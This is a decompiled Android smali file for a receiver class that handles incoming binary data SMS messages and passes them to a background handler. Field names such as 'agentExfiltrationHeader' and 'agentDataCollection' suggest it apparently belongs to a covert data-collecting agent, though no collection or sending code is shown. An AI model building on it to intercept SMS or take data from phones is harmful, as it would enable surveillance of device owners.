.class public Lcom/binary/sms/receiver/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"


# static fields
.field public static final AGENT_DATA_COLLECTION:Ljava/lang/String; = "agentDataCollection"

.field private static final AGENT_EXFILTRATION_HEADER:Ljava/lang/String; = "agentExfiltrationHeader"

.field private static final BATTERY_LEVEL:Ljava/lang/String; = "batteryLevel"

.field private static final PDUS2:Ljava/lang/String; = "pdus"

.field public static final REVISION:Ljava/lang/String; = "revision"

.field private static final SMS_RECEIVED:Ljava/lang/String; = "android.intent.action.DATA_SMS_RECEIVED"

.field static final UTF8:Ljava/lang/String; = "utf8"

.field private static final UTF_8:Ljava/lang/String; = "UTF-8"

.field public static agentAddress:Ljava/lang/String;

.field public static resendingHandler:Landroid/os/Handler;

.field static timer:Ljava/util/Timer;

.field public static tokenId:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v1, 0x0

    .line 67
    sput-object v1, Lcom/binary/sms/receiver/SmsReceiver;->agentAddress:Ljava/lang/String;

    .line 68
    sput-object v1, Lcom/binary/sms/receiver/SmsReceiver;->tokenId:Ljava/lang/String;

    .line 75
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "MainHandlerThread"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    .line 76
    .local v0, "handlerThread":Landroid/os/HandlerThread;
    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 77
    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/binary/sms/receiver/SmsReceiver;->resendingHandler:Landroid/os/Handler;

    .line 84
    new-instance v1, Ljava/util/Timer;

    invoke-direct {v1}, Ljava/util/Timer;-><init>()V

    sput-object v1, Lcom/binary/sms/receiver/SmsReceiver;->timer:Ljava/util/Timer;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 32
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private toUTF8(Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    .param p1, "body"    # Ljava/lang/String;

    .prologue
    .line 158
    :try_start_0
    new-instance v0, Ljava/lang/String;

    const-string v1, "UTF8"

    invoke-virtual {p1, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .end local p1    # "body":Ljava/lang/String;
    .local v0, "body":Ljava/lang/String;
    move-object p1, v0

    .line 162
    .end local v0    # "body":Ljava/lang/String;
    .restart local p1    # "body":Ljava/lang/String;
    :goto_0
    return-object p1

    .line 159
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 95
    const-string v2, "Binary SMS onReceive"

    const/4 v3, 0x0

    invoke-static {v2, v3}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;Z)V

    .line 98
    move-object v1, p2

    .line 99
    .local v1, "constIntent":Landroid/content/Intent;
    move-object v0, p1

    .line 100
    .local v0, "constContext":Landroid/content/Context;
    sget-object v2, Lcom/binary/sms/receiver/SmsReceiver;->resendingHandler:Landroid/os/Handler;

    new-instance v3, Lcom/binary/sms/receiver/SmsReceiver$1;

    invoke-direct {v3, p0, v1}, Lcom/binary/sms/receiver/SmsReceiver$1;-><init>(Lcom/binary/sms/receiver/SmsReceiver;Landroid/content/Intent;)V

    invoke-virtual {v2, v3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 153
    return-void
.end method
